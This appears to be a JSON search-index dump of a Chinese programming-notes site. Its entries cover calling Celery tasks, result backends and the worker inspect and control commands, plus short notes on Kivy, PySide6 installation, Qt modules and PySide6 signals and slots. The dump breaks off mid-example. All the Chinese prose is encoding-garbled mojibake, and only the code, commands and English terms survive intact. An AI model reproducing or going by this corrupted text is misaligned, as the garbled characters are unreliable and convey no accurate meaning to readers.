è°ƒç”¨æˆ‘ä»¬åˆ›å»ºçš„å®ä¾‹ä»»åŠ¡ï¼Œå¯ä»¥é€šè¿‡ delay() è¿›è¡Œè°ƒç”¨ã€‚ delay() æ˜¯ apply_async() çš„å¿«æ·æ–¹æ³•ï¼Œå¯ä»¥æ›´å¥½çš„æ§åˆ¶ä»»åŠ¡çš„æ‰§è¡Œï¼ˆè¯¦æƒ…ï¼šè°ƒç”¨ä»»åŠ¡ï¼šCalling Tasksï¼‰: >>> from tasks import add >>> add.delay(4, 4) è¯¥ä»»åŠ¡å·²ç»æœ‰èŒç¨‹ï¼ˆWorkerï¼‰å¼€å§‹å¤„ç†ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—è¿›è¡ŒæŸ¥çœ‹æ‰§è¡Œæƒ…å†µã€‚ è°ƒç”¨ä»»åŠ¡ä¼šè¿”å›ä¸€ä¸ª AsyncResult çš„å®ä¾‹ï¼Œç”¨äºæ£€æµ‹ä»»åŠ¡çš„çŠ¶æ€ï¼Œç­‰å¾…ä»»åŠ¡å®Œæˆè·å–è¿”å›å€¼ï¼ˆå¦‚æœä»»åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰ã€‚ é»˜è®¤è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸å¼€å¯çš„ï¼Œå¦‚æœå¼€å¯åˆ™éœ€è¦é…ç½® Celery çš„ç»“æœåç«¯ï¼Œè§ ä¿å­˜ä»»åŠ¡ç»“æœ ã€‚ è¯¦ç»†è¯´æ˜ ä½¿ç”¨ delay() æ–¹æ³•è¿›è¡Œè°ƒç”¨: >>> add.delay(2, 2) delay() å®é™…ä¸Šä¸º apply_async() çš„å¿«æ·ä½¿ç”¨: >>> add.apply_async((2, 2)) apply_async() å¯ä»¥æŒ‡å®šè°ƒç”¨æ—¶æ‰§è¡Œçš„å‚æ•°ï¼Œä¾‹å¦‚è¿è¡Œçš„æ—¶é—´ï¼Œä½¿ç”¨çš„ä»»åŠ¡é˜Ÿåˆ—ç­‰: >>> add.apply_async((2, 2), queue='lopri', countdown=10) ä¸Šé¢çš„å®ä¾‹ä¸­ï¼Œä»»åŠ¡è¢«ä¸‹å‘åˆ° lopri é˜Ÿåˆ—ä¸­ï¼Œä»»åŠ¡ä¸‹å‘ä¹‹åä¼šåœ¨æœ€æ—©10ç§’å†…æ‰§è¡Œã€‚ ç›´æ¥è°ƒç”¨ä»»åŠ¡å‡½æ•°è¿›è¡Œæ‰§è¡Œä»»åŠ¡ï¼Œä¸ä¼šå‘é€ä»»ä½•ä»»åŠ¡æ¶ˆæ¯: >>> add(2, 2) 4 æ¯ä¸€ä¸ªä»»åŠ¡è¢«è°ƒç”¨æ—¶ä¼šèµ‹å€¼ä¸€ä¸ªçš„ä»»åŠ¡IDï¼ˆUUIIDï¼‰: res = add.delay(2, 2) res.id å¦‚æœä»»åŠ¡æ‰§è¡Œå¼•å‘å¼‚å¸¸ï¼Œå¯ä»¥è¿›è¡Œæ£€æŸ¥å¼‚å¸¸ä»¥åŠæº¯æºï¼Œé»˜è®¤æƒ…å†µä¸‹ result.get() ä¼šæŠ›å‡ºå¼‚å¸¸: >>> res = add.delay(2) >>> res.get(timeout=1) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"/opt/devel/celery/celery/result.py\", line 113, in get interval=interval) File \"/opt/devel/celery/celery/backends/rpc.py\", line 138, in wait_for raise meta['result'] TypeError: add() takes exactly 2 arguments (1 given) å¦‚æœä¸å¸Œæœ› Celery æŠ›å‡ºå¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡è®¾ç½® propagate æ¥è¿›è¡Œç¦ç”¨: >>> res.get(propagate=False) TypeError('add() takes exactly 2 arguments (1 given)',) åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»–å¯ä»¥è¿”å›å¼•å‘é”™è¯¯çš„å®ä¾‹ï¼Œéœ€è¦æ£€æŸ¥ä»»åŠ¡æ˜¯å¦æ‰§è¡ŒæˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œå¯ä»¥é€šè¿‡åœ¨ç»“æœå®ä¾‹ä¸­ä½¿ç”¨å¯¹åº”çš„æ–¹æ³•: >>> res.failed() True >>> res.successful() False å¦‚ä½•çŸ¥é“ä»»åŠ¡æ˜¯å¦æ‰§è¡Œå¤±è´¥ï¼Ÿå¯ä»¥é€šè¿‡æŸ¥çœ‹ä»»åŠ¡çš„ state è¿›è¡ŒæŸ¥çœ‹: >>> res.state 'FAILURE' ä¸€ä¸ªä»»åŠ¡åªèƒ½æœ‰å½“å‰åªèƒ½æœ‰ä¸€ä¸ªçŠ¶æ€ï¼Œä½†ä»–çš„æ‰§è¡Œè¿‡ç¨‹å¯ä»¥ä¸ºå¤šä¸ªçŠ¶æ€ï¼Œä¸€ä¸ªå…¸å‹çš„é˜¶æ®µæ˜¯: PENDING -> STARTED -> SUCCESS å¯åŠ¨çŠ¶æ€æ˜¯ä¸€ç§æ¯”è¾ƒç‰¹æ®Šçš„çŠ¶æ€ï¼Œä»…åœ¨ task_track_started å¯ç”¨è®¾ç½®æˆ– @task(track_started=True)çš„æƒ…å†µä¸‹æ‰ä¼šè¿›è¡Œè®°å½•ã€‚ æŒ‚èµ·çŠ¶æ€å®é™…ä¸Šä¸æ˜¯è®°å½•çŠ¶æ€ï¼Œè€Œæ˜¯æœªçŸ¥ä»»åŠ¡IDçš„é»˜è®¤çŠ¶æ€ï¼Œå¯ä»¥ä»æ­¤å®ä¾‹ä¸­çœ‹åˆ°: >>> from proj.celery import app >>> res = app.AsyncResult('this-id-does-not-exist') >>> res.state 'PENDING' é‡è¯•ä»»åŠ¡æ¯”è¾ƒå¤æ‚ï¼Œä¸ºäº†è¯æ˜ï¼Œä¸€ä¸ªä»»åŠ¡ä¼šé‡è¯•ä¸¤æ¬¡ï¼Œä»»åŠ¡çš„é˜¶æ®µä¸º: PENDING -> STARTED -> RETRY -> STARTED -> RETRY -> STARTED -> SUCCESS ä¿å­˜ä»»åŠ¡ç»“æœ å¦‚ä½¿ç”¨Redisä½œä¸ºCeleryç»“æœåç«¯å’Œä¸­é—´äºº, app = Celery('tasks', backend='redis://localhost', broker='redis://localhost') å·²ç»é…ç½®ç»“æœåç«¯ï¼Œé‡æ–°è°ƒç”¨æ‰§è¡Œä»»åŠ¡ã€‚ä¼šå¾—åˆ°è°ƒç”¨ä»»åŠ¡åè¿”å›çš„ä¸€ä¸ª AsyncResult å®ä¾‹: >>> result = add.delay(4, 4) ready() å¯ä»¥æ£€æµ‹æ˜¯å¦å·²ç»å¤„ç†å®Œæ¯•: >>> result.ready() False æ•´ä¸ªä»»åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸ºå¼‚æ­¥çš„ï¼Œå¦‚æœä¸€ç›´ç­‰å¾…ä»»åŠ¡å®Œæˆï¼Œä¼šå°†å¼‚æ­¥è°ƒç”¨è½¬æ¢ä¸ºåŒæ­¥è°ƒç”¨: >>> result.get(timeout=1) 8 å¦‚æœä»»åŠ¡å‡ºç°å¼‚å¸¸ï¼Œget() ä¼šå†æ¬¡å¼•å‘å¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡ propagate å‚æ•°è¿›è¡Œè¦†ç›–: >>> result.get(propagate=False) å¦‚æœä»»åŠ¡å‡ºç°å¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå›æº¯: >>> result.traceback æ³¨è§£ ä¹Ÿå¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®, è§ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/celery_more/conf_celery å¦‚æœåç«¯ä½¿ç”¨èµ„æºè¿›è¡Œå­˜å‚¨ç»“æœï¼Œå¿…é¡»è¦é’ˆå¯¹è°ƒç”¨ä»»åŠ¡åè¿”å›æ¯ä¸€ä¸ª AsyncResult å®ä¾‹è°ƒç”¨ get() æˆ– forget() ï¼Œè¿›è¡Œèµ„æºé‡Šæ”¾ã€‚ è¿œç¨‹æ§åˆ¶ ä½¿ç”¨ RabbitMQï¼ˆAMQPï¼‰ã€Redis æˆ– Qpid ä½œä¸ºä¸­é—´äººï¼ˆBrokerï¼‰ï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶æ§åˆ¶å’Œæ£€æŸ¥èŒç¨‹ï¼ˆWorkerï¼‰ã€‚ ä¾‹å¦‚ï¼Œå½“å‰èŒç¨‹ï¼ˆWorkerï¼‰æ­£åœ¨å¤„ç†çš„ä»»åŠ¡: $ celery -A proj inspect active è¿™æ˜¯é€šè¿‡å¹¿æ’­æ¶ˆæ¯å®ç°çš„ï¼Œé›†ç¾¤ä¸­æ‰€æœ‰èŒç¨‹ï¼ˆWorkerï¼‰éƒ½ä¼šæ‰€æœ‰æ”¶åˆ°è¿œç¨‹æ§åˆ¶å‘å‡ºçš„æŒ‡ä»¤ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡ --destination é€‰é¡¹æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªèŒç¨‹ï¼ˆWorkerï¼‰è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨\",\"è¿›è¡Œåˆ†å‰²èŒç¨‹ï¼ˆWorkerï¼‰ä¸»æœºåˆ—è¡¨: $ celery -A proj inspect active --destination=celery@example.com å¦‚æœæ²¡æœ‰æä¾›ç›®çš„åœ°ï¼Œé‚£ä¹ˆæ¯ä¸ªå·¥ä½œäººå‘˜éƒ½å°†é‡‡å–è¡ŒåŠ¨å¹¶å›å¤è¯·æ±‚ã€‚ celery inspect å‘½ä»¤ä¸èƒ½ä¿®æ”¹ç¨‹åºï¼Œåªèƒ½è¿›è¡ŒæŸ¥çœ‹èŒç¨‹ï¼ˆWorkerï¼‰æ¦‚å†µä»¥åŠç»Ÿè®¡ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ help è¿›è¡ŒæŸ¥çœ‹: $ celery -A proj inspect --help celery control å‘½ä»¤å¯ä»¥æŸ¥çœ‹å®é™…ä¸Šæ”¹å˜äº†å·¥ä½œåœ¨è¿è¡Œæ—¶çš„çŠ¶å†µ: $ celery -A proj control --help ä¾‹å¦‚ï¼Œå¯ä»¥å¼ºåˆ¶èŒç¨‹ï¼ˆWorkerï¼‰å¯ç”¨äº‹ä»¶æ¶ˆæ¯ï¼ˆç”¨äºç›‘æ§ä»»åŠ¡ä»¥åŠèŒç¨‹ï¼ˆWorkerï¼‰ï¼‰: $ celery -A proj control enable_events å¯åŠ¨äº‹ä»¶åï¼Œå¯ä»¥å¯åŠ¨äº‹ä»¶è½¬å‚¨ç¨‹åºï¼Œè¿›è¡ŒæŸ¥çœ‹èŒç¨‹ï¼ˆWorkerï¼‰ç›®å‰æ‰§è¡Œçš„çŠ¶å†µ: $ celery -A proj events --dump æˆ–è€…å¯ä»¥å¯åŠ¨ curses æ¥å£: $ celery -A proj events å½“ç›‘æ§å®Œæ¯•ä¹‹åï¼Œå¯ä»¥ç¦ç”¨äº‹ä»¶: $ celery -A proj control disable_events celery status å‘½ä»¤å¯ä»¥è¿œç¨‹æ§åˆ¶å¹¶ä¸”æ˜¾ç¤ºé›†ç¾¤ä¸­èŒç¨‹ï¼ˆWorkerï¼‰çš„åˆ—è¡¨: $ celery -A proj status æŸ¥çœ‹æ‰€æœ‰ä»»åŠ¡ è°ƒç”¨ Celery å®ä¾‹çš„ tasks app = Celery() app.tasks ä»…å½“å¯¼å…¥å®šä¹‰çš„æ¨¡å—æ—¶ä»»åŠ¡æ‰ä¼šè¢«æ³¨å†Œã€‚ é»˜è®¤åŠ è½½ç¨‹åºå¯¼å…¥é…ç½® imports åˆ—å‡ºçš„æ‰€æœ‰æ¨¡å—ã€‚ app.task() è£…é¥°å™¨è´Ÿè´£åœ¨åº”ç”¨ä»»åŠ¡æ³¨å†Œè¡¨ä¸­æ³¨å†Œä½ çš„ä»»åŠ¡ã€‚ è¯¦ç»†è¯´æ˜ ./celery_more/option_install ./celery_more/conf_celery ./celery_more/conf_for_redis ./celery_more/å‘½ä»¤è¡Œå·¥å…· ./celery_more/load_celery ./celery_more/canvas ./celery_more/task ./celery_more/exception ./celery_more/logging ./celery_more/åº”ç”¨è®¾è®¡æ‹“å±• ./celery_more/ä¼˜åŒ– ./celery_more/AMQP å…¥é—¨ ./celery_more/è°ƒè¯• ./celery_more/å¹¶å‘ ./celery_more/ä¿¡å· ./celery_more/ä¸€äº›é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-celry.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-celry.html"},{"title":"kivy","text":"ä¸€ä¸ªå¼€æºçš„GUIåº“, ç›¸å¯¹PyQT, tkinterè¿™ç§GUIæ¡†æ¶è€Œè¨€, å¢åŠ äº†å¯¹ç§»åŠ¨å¹³å°å¦‚å®‰å“, IOSçš„æ”¯æŒ. (è™½ç„¶Qtè²Œä¼¼ä¹Ÿæ”¯æŒç¼–å†™å®‰å“åº”ç”¨, ä¸è¿‡ä½¿ç”¨å¥½éº»çƒ¦) å®˜ç½‘æ–‡æ¡£: https://kivy.org/doc/stable/gettingstarted/intro.html è¯¦è§: kivy","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy.html"},{"title":"Kivy","text":"æ³¨è§£ çœ‹ç€çœ‹ç€, å‘ç°å¦‚æœè¦è°ƒç”¨å®‰å“çš„API(ä¸å®‰å“äº¤äº’), å®é™…è¿˜æ˜¯éœ€è¦ä¸Javaäº¤äº’, è°ƒç”¨Javaç±». è¿™æ ·è¿˜ä¸å¦‚ç›´æ¥å»æJava, åæ­£ä»¥å‰å¤§å­¦ä¸»æ”»å°±æ˜¯Java, è™½ç„¶æ˜¯Webæ–¹å‘, Kivy, å¼ƒä¹‹... å®‰è£…kivy ä½¿ç”¨-å±æ€§å£°æ˜ ä½¿ç”¨-kvè¯­è¨€","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-index.html"},{"title":"Python Qtå®˜æ–¹æ¡†æ¶ pyside6","text":"å®˜ç½‘æ–‡æ¡£:: Qt for Python ç›¸å…³èµ„æºå®˜ç½‘ä¸‹è½½åœ°å€: https://download.qt.io/snapshots/ å®‰è£…: pip install pyside6 ä¸»è¦ç»„ä»¶: PySide6: ä½¿ç”¨QT6çš„API ShiBoken6: æä¾›äº†äº›ä¸ C++ äº¤äº’çš„æ–¹å¼ (æŠŠC++é¡¹ç›®æ‹“å±•åˆ°python), åŠä¸€äº›å·¥å…·æ–¹æ³•(å·¥å…·æ¨¡å—) å…¶å®å®‰è£…çš„è¿˜æœ‰é¢å¤–çš„åŒ…: (dev_venv) yanque@mbp14 project % pip list | grep -iE 'pyside|shi' PySide6 6.4.1 PySide6-Addons 6.4.1 PySide6-Essentials 6.4.1 shiboken6 6.4.1 PySide6-Essentials, æ˜¯å¿…è¦åŒ… PySide6-Addons, é™„åŠ (additional)åŒ… PySide6.QtWidgetsä¸‹å¸¸ç”¨æ§ä»¶ å¸ƒå±€ç›¸å…³ QHBoxLayout, æ°´å¹³å¸ƒå±€(ä»å·¦åˆ°å³) QVBoxLayout, å‚ç›´å¸ƒå±€(ä»ä¸Šåˆ°ä¸‹) QGridLayout, æ ¼å­å¸ƒå±€ QFormLayout, åªæœ‰ä¸¤åˆ—çš„æ ¼å­å¸ƒå±€ æ§ä»¶ QPushButton, ç‚¹å‡»æŒ‰é’® QLineEdit, å•è¡Œæ–‡æœ¬æ¡† QPlainTextEdit, å¤šè¡Œçº¯æ–‡æœ¬æ¡† QTextBrowser, æ–‡æœ¬æµè§ˆå™¨(åªè¯») QLabel, æ™®é€šæ ‡ç­¾ è¯¦æƒ… ./pyside6_more","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6.html"},{"title":"Qtæ”¯æŒçš„æ¨¡å—","text":"å®˜ç½‘åœ°å€:: modules ä¸€äº›é™„åŠ è¯´æ˜: ./modules å…¶å®ä¸»è¦æ˜¯ pyside6 ä¸‹é¢çš„ä¸€äº›æ¨¡å—: QtBluetooth, æä¾›ä¸è®¾å¤‡è“ç‰™æ¥å£çš„è®¿é—® QtCharts, æä¾›ä¸€ç³»åˆ—ä¾¿æ·ä½¿ç”¨çš„å›¾è¡¨ç»„ä»¶ QtConcurrent, æä¾›å¤šçº¿ç¨‹ç¼–ç¨‹çš„é«˜çº§æ¥å£, ä¸éœ€è¦å…³å¿ƒå¦‚ä½•ç»´æŠ¤åº•å±‚çš„é”ç­‰. ğŸª QtCore, æ ¸å¿ƒé GUI æ–¹æ³• ğŸª QtGui, æ ¸å¿ƒ GUI æ–¹æ³• QtDataVisualization, 3ç»´å¯è§†åŒ–æ•°æ®å±•ç¤º(æ¡å½¢å›¾, æ•£ç‚¹å›¾, è¡¨å±‚å›¾) QtDBus, ç»Ÿä¸€çš„, åŸºäºlinuxçš„ IPC, RPC åè®® QtDesigner, ç»§æ‰¿ Qt Designer çš„ç±» QtHelp, å†…ç½®å¸®åŠ©æ–‡æ¡£(ä¸åœ¨çº¿æ–‡æ¡£å†…å®¹ä¸€è‡´) Qt Multimedia, å¤šåª’ä½“ä½¿ç”¨ç›¸å…³ API Qt Multimedia Widgets, å¤šåª’ä½“ä½¿ç”¨ç›¸å…³åŸºç¡€æ§ä»¶ API QtNetwork, ç¼–ç  TCP/IP å®¢æˆ·ç«¯/æœåŠ¡ç«¯ç›¸å…³ Qt Network Authorization, æš´éœ²ç”¨æˆ·å¯†ç , æä¾› Qt åº”ç”¨å¯¹ åœ¨çº¿åº”ç”¨(å¦‚HTTPæœåŠ¡)çš„é™åˆ¶æ€§è®¿é—® QtNfc, è®¿é—®è®¾å¤‡NFCæ¥å£ QtOpenGL, æ˜“äºä½¿ç”¨ OpenGL (GPUç›¸å…³çš„GUIæ¥å£, ä¸€ç³»åˆ—æ“ä½œå›¾å½¢/å›¾ç‰‡çš„å‡½æ•°API) QtOpenGL Widgets, OpenGL ç›¸å…³çš„æ§ä»¶. Qt Positioning, ä½ç½®è®¿é—®. å«æ˜Ÿä¿¡æ¯å’ŒåŒºåŸŸç›‘æµ‹ Qt PDF, å±•ç¤ºPDFæ–‡æ¡£ç›¸å…³ Qt PDF Widgets, æ”¯æŒçš„PDFè§†å›¾æ§ä»¶ QtPrintSupport, è·¨å¹³å°æ‰“å°æ”¯æŒ QtQml, QML [1] API (å¼•å…¥ç±»ä¼¼Web XMLæŠ€æœ¯). QtQuick, Qt åº”ç”¨ä¸­åµŒå…¥ Qt Quick (å¼•å…¥ç±»ä¼¼Web XMLæŠ€æœ¯), å…¶å®å°±æ˜¯åµŒå…¥ js å½¢å¼ç¼–ç çš„ä¸œè¥¿ QtQuickControls2, ä» C++ è®¾ç½®æ§ä»¶ QtQuickWidgets, QtQuick ç›¸å…³æ§ä»¶çš„åµŒå…¥ QtRemoteObjects, åŸºäºQtçš„ IPC æ¨¡å—, æ˜“äºä¸è®¡ç®—æœºè¿›ç¨‹é€šä¿¡ Qt Scxml, ä» SCXML æ–‡ä»¶åˆ›å»ºå’Œä½¿ç”¨çŠ¶æ€æœº Qt Sensors, è®¿é—®ç¡¬ä»¶ä¼ æ„Ÿå™¨ Qt Serial Port, ä¸ç¡¬ä»¶åŠè™šæ‹Ÿä¸²å£çš„äº¤äº’ Qt Spatial Audio, åœ¨3Dç©ºé—´ä¸­å»ºæ¨¡å£°æºåŠå…¶å‘¨å›´ç¯å¢ƒ QtSql, æä¾›ä¸æ•°æ®åº“çš„æ— ç¼è¡”æ¥ QtStateMachine, åˆ›å»ºå’Œæ‰§è¡ŒçŠ¶æ€å›¾ (æ²¡æ‡‚) QtSvg, svgå›¾ç‰‡çš„å±•ç¤º QtSvgWidgets, svgç›¸å…³æ§ä»¶ QtTest, Qt çš„å•å…ƒæµ‹è¯•åº“ QtUiTools, å¤„ç† Qt Designer è®¾è®¡çš„å†…å®¹, åº”è¯¥æ˜¯ .ui æ–‡ä»¶ Qt WebChannel, æ— ç¼è¡”æ¥å¯¹ HTML/JavaScript çš„è®¿é—®, ä¸»è¦æ˜¯é€šè¿‡å…¶ QObject æˆ– QML objects QtWebEngine Core C++ Classes, QtWebEngine å’Œ QtWebEngineWidgets çš„å…¬å…± API å…±äº« QtWebEngine Widgets C++ Classes, æä¾›Qt åº”ç”¨å†… C++ ç±»å¯¹ Web éƒ¨åˆ†å†…å®¹çš„æ¸²æŸ“ QtWebEngine QML Types, Qt åº”ç”¨å†… QML ç±»å‹å¯¹ Web éƒ¨åˆ†å†…å®¹çš„æ¸²æŸ“ Qt WebSockets, ä¸ WebSocket çš„é€šä¿¡ ğŸª QtWidgets, ä½¿ç”¨ C++ çš„æ–¹æ³•, å¯¹ Qt GUI çš„æ‹“å±• QtXml, æä¾›äº† C++ å±‚é¢çš„ DOM å®ç° Qt3DAnimation, åŸºç¡€çš„ 3D åŠ¨ç”»å…ƒç´  Qt3D Core, è¿‘ä¹å®æ—¶æ¨¡æ‹Ÿç³»ç»Ÿçš„åŠŸèƒ½ æ–¹æ³• Qt3D Extras, Qt 3D å¼€å‘çš„é¢„æ„å»ºå…ƒç´  Qt3D Input, Qt 3D å¼€å‘ä¸‹, å¤„ç†ç”¨æˆ·è¾“å…¥ Qt3D Logic, Qt 3D å¼€å‘ä¸‹, å¯ç”¨å¸§ä¸Qt 3Dåç«¯çš„åŒæ­¥ Qt3D Render, æ”¯æŒä½¿ç”¨Qt 3Dè¿›è¡Œ2Då’Œ3Dæ¸²æŸ“çš„åŠŸèƒ½ Qt CoAP, å®ç°ç”±RFC 7252å®šä¹‰çš„CoAPå®¢æˆ·ç«¯ Qt OPC UA, ç”¨äºå·¥ä¸šåº”ç”¨ä¸­çš„æ•°æ®å»ºæ¨¡å’Œæ•°æ®äº¤æ¢çš„åè®® Qt MQTT, æä¾›MQTTåè®®è§„èŒƒçš„å®ç° [1] QML: æ˜¯ Qt ä¸º Qt Quick æ‰“é€ çš„æè¿°ç•Œé¢çš„æ–°è¯­è¨€ï¼Œç„¶è€Œå°±è¯­æ³•ä¸Šï¼ŒåŸºæœ¬å°±æ˜¯å¯¹ Javascript åšäº†æ‰©å±•ã€‚ å‡ ä¹æ‰€æœ‰ Javascript çš„è¯­æ³•éƒ½å¯ä»¥ä½¿ç”¨ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QT-supported-module.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-QT-supported-module.html"},{"title":"æ•™ç¨‹","text":"åŸºæœ¬è¯´æ˜è§: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pyside6_more/index Widgetsè¯´æ˜ æ§ä»¶ç¤ºä¾‹å‚è€ƒ: gallery å¸¸ç”¨æ§ä»¶: QPushButton, å¯ç‚¹å‡»çš„æŒ‰é’® QLabel, æ ‡ç­¾æ§ä»¶ QLineEdit, è¡Œç¼–è¾‘æ¡† åˆ›å»ºåº”ç”¨ç¨‹åºéƒ½éœ€è¦å…ˆå¯¼å…¥ QApplication from PySide6.QtWidgets import QApplication, QLabel app = QApplication([]) # do something # QLabel å‚æ•°é™¤äº†æ˜¯çº¯æ–‡æœ¬, è¿˜å¯ä»¥æ˜¯ HTML label = QLabel(\"<font color=red size=40>Hello World!</font>\") app.exec() å½“ QApplication ä¸éœ€è¦å‚æ•°æ—¶, å°±ç»™ç©ºåˆ—è¡¨å³å¯, éœ€è¦å‘½ä»¤è¡Œå‚æ•°å°±å†™ sys .argv ä¿¡å·-æ§½ æœºåˆ¶ Signals and Slots å®˜ç½‘:: Signals and Slots ç”¨äºæ§ä»¶ä¹‹é—´çš„é€šä¿¡, ç±»ä¼¼äºå›è°ƒå‡½æ•°, Qt çš„æ ¸å¿ƒåŠŸèƒ½ å½“æ§ä»¶å¯¹è±¡å‘ç”ŸçŠ¶æ€æ”¹å˜æ—¶, ä¿¡å·ç”±æ§ä»¶å¯¹è±¡å‘å‡º (å®˜ç½‘è¯´æ˜¯çœŸæ­£çš„å¯¹è±¡å°è£…?) æ§½ç”¨äºæ¥æ”¶ä¿¡å· ä¿¡å·ä¹Ÿå¯ç›´æ¥è¿æ¥åˆ°å¦ä¸€ä¸ªä¿¡å·, ç›¸å½“äºä¸¤ä¸ªä¿¡å·åŒæ—¶å‘ç”Ÿ(ä¸€ä¸ªä¿¡å·å‘ç”Ÿæ—¶, ä¼šç«‹å³å‡ºå‘å¦ä¸€ä¸ªä¿¡å·, ä¸è®ºç¬¬ä¸€ä¸ªä¿¡å·å‘ç”Ÿæ˜¯å¦å®Œæ¯•) Qt å†…éƒ¨ä¹Ÿé¢„å®šäºäº†ä¸€äº›æ§½, æ¯”å¦‚ QLineEdit çš„ clear æ–¹æ³• ä¿¡å·ä¸æ§½çš„è¿æ¥ä½¿ç”¨ connect , è¿”å› QMetaObject.Connection å¯¹è±¡, è§£ç»‘ä½¿ç”¨è¿™ä¸ªè¿”å›å¯¹è±¡çš„ disconnect() æ–¹æ³• å¯ç”¨äºå‡å°‘ä¾èµ–, è§£å¶? ä½†æ˜¯ä¸ªäººè§‰å¾—, ä½¿ç”¨ connet è¿æ¥ä¿¡å·å’Œæ§½çš„æ—¶å€™è¿˜æ˜¯çŸ¥é“äº†è‡ªå·±è¿æ¥äº†å“ªä¸ª, åªæ˜¯ä¸çŸ¥é“ä¹‹åè¿æ¥çš„çš„å“ªä¸ªæ§½ä¼šåšå‡ºå“ªäº›æ“ä½œ, æ„Ÿè§‰ä¸ç®—å®Œå…¨ç»“å¶ æ§½ Slot ä½¿ç”¨è£…é¥°å™¨: from PySide6.QtCore import Slot @Slot() def fun(): pass ä½¿ç”¨æ§ä»¶çš„ connect è¿æ¥åˆ°æ§½, clicked å°±æ˜¯ä¿¡å·: # Create a button button = QPushButton(\"Click me\") # Connect the button to the function button.clicked.connect(fun) æ˜¾ç¤ºæ§ä»¶: # Show the button button.show() æ³¨è§£ å…¶å®æ™®é€šçš„ç±»ä¼¼è¿™æ ·çš„å‡½æ•°å®šä¹‰(æ— å‚æ•°çš„å‡½æ•°å®šä¹‰), åŠ ä¸åŠ  @Slot çš„è£…é¥°å™¨å®é™…æµ‹è¯•æ²¡ä»€ä¹ˆå·®åˆ«, ä½†æ˜¯è¿„ä»Šä¸ºæ­¢è¿˜æ²¡æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„è¯´æ³•. æ¯”å¦‚? ä¸ºä»€ä¹ˆæ™®é€šçš„å‡½æ•°éœ€è¦åŠ  @Slot æ³¨è§£? ä»€ä¹ˆæ—¶å€™èµ·ä½œç”¨? ç­‰ç­‰. å®˜ç½‘åªæœ‰ä¸€å¥è¿™ä¸ª: Signals can also be connected to free functions è¿™é‡Œæ²¡åŠ¨ free functions æ˜¯å•¥æ„æ€, å®˜ç½‘ç»™çš„ä¾‹å­åƒæ˜¯è¯´ å¤–éƒ¨å®šä¹‰çš„è‡ªç”±å‡½æ•°? ä½†æ˜¯ä¸ªäººè§‰å¾—åº”è¯¥ä¹ŸåŒ…å«æ— å‚æ•°æ–¹æ³•å§. æ‹“å±•è¯´æ˜ Signals è‡ªå®šä¹‰ä¿¡å·, å¯ä¼ å…¥ä¸åŒçš„ç±»å‹: from PySide6.QtCore import Signal Python ç±»å‹: signal1 = Signal(int) # Python types Qt ç±»å‹: signal2 = Signal(QUrl) # Qt Types å¤šä¸ªå‚æ•°: signal3 = Signal(int, str, int) # more than one type å¯é€‰å‚æ•°: signal4 = Signal((float,), (QDate,)) # optional types Signal å¯æ¥å—çš„å…³é”®è¯å‚æ•°: name: str è¡¨ç¤ºè¿™ä¸ªæ§½çš„åç§°, è‹¥æ²¡æŒ‡å®š, åˆ™ä½¿ç”¨å˜é‡å arguments: list å¯ç”¨äº QML åº”ç”¨, è¡¨ç¤ºæŒ‰ç…§åç§°å¼•ç”¨å‘å°„å€¼ å¦‚: sumResult = Signal(int, arguments=['sum']) QML: Connections { target: ... function onSumResult(sum) { // do something with 'sum' } Slot ä¸ä¿¡å·ç±»ä¼¼, æ”¯æŒä¼ å…¥ç±»å‹: @Slot(str) def slot_function(self, s): ... å¯æ¥å—çš„å…³é”®å­—å‚æ•°: name: str æ§½åç§°, æœªæŒ‡å®šåˆ™ä¸ºå‡½æ•°å result: è¿”å›ç±»å‹, å¯ä»¥æ˜¯ Python ç±»å‹, ä¹Ÿå¯ä»¥æ˜¯ C ç±»å‹ ä¸åŒç±»å‹çš„è¶…è½½ä¿¡å·ä¸æ§½ å³ä¸€ä¸ªä¿¡å·å¯æ¥å—å¯å˜ç±»å‹å‚æ•°, å¦‚å¯æ¥å— int ä¸ str ç±»å‹: Signal((int,), (str,)) åˆ—å®˜ç½‘ä¾‹å­: import sys from PySide6.QtWidgets import QApplication, QPushButton from PySide6.QtCore import QObject, Signal, Slot class Communicate(QObject): # create two new signals on the fly: one will handle # int type, the other will handle strings speak = Signal((int,), (str,)) def __init__(self, parent=None): super().__init__(parent) self.speak[int].connect(self.say_something) self.speak[str].connect(self.say_something) # define a new slot that receives a C 'int' or a 'str' # and has 'say_something' as its name @Slot(int) @Slot(str) def say_something(self, arg): if isinstance(arg, int): print(\"This is a number:\", arg) elif isinstance(arg, str): print(\"This is a string:\", arg) if __name__ == \"__main__\": app = QApplication(sys.argv) someone = Communicate() # emit 